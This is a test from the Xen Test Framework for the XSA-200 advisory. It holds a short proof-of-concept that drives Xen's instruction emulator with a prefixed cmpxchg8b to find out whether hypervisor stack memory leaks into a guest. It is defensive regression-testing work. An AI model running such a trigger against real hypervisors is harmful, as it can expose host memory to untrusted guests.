/**
 * @file tests/xsa-200/main.c
 * @ref test-xsa-200
 *
 * @page test-xsa-200 XSA-200
 *
 * Advisory: [XSA-200](http://xenbits.xen.org/xsa/advisory-200.html)
 *
 * Before XSA-200, the instruction emulator in Xen had a bug where it
 * incorrectly honoured the legacy operand-side override prefix for
 * `cmpxchg8b`.  This caused it to only read a subset of memory operand, but
 * write back all register state properly, leaking a certain quantity of the
 * hypervisor stack into the guest.
 *
 * In Xen 4.8 development cycle, the bug was mitigated by accidentally
 * causing such an instruction to suffer an unconditional @#UD exception.
 *
 * Construct such a `cmpxchg8b` which should unconditionally fail and write
 * mem into prev, checking whether mem had been read correctly.  As there is a
 * slim chance that the stack rubble matches 0xc2, repeat the operation up to
 * 10 times.
 *
 * @see tests/xsa-200/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-200 PoC";

bool test_needs_fep = true;

void test_main(void)
{
    uint64_t mem = 0xc2c2c2c2c2c2c2c2ull;

    uint64_t old = 0x0123456789abcdefull;
    uint64_t new = 0xfedcba9876543210ull;
    uint64_t prev;

    unsigned int i;
    exinfo_t fault = 0;

    for ( i = 0; i < 10; ++i )
    {
        /* Poke the emulator. */
        asm volatile (_ASM_XEN_FEP "1: .byte 0x66; cmpxchg8b %[ptr]; 2:"
                      _ASM_EXTABLE_HANDLER(1b, 2b, ex_record_fault_edi)
                      : "=A" (prev), [ptr] "+m" (mem), "+D" (fault)
                      : "c" ((uint32_t)(new >> 32)), "b" ((uint32_t)new),
                        "0" (old), "X" (ex_record_fault_edi));

        if ( fault == EXINFO_SYM(UD, 0) )
            return xtf_success("Success: Not vulnerable to XSA-200\n");
        else if ( fault )
            return xtf_error("Error: Unexpected fault %08x\n", fault);

        if ( prev != mem )
            return xtf_failure("Fail: Hypervisor stack leaked into guest\n");
    }

    xtf_success("Success: Probably not vulnerable to XSA-200\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
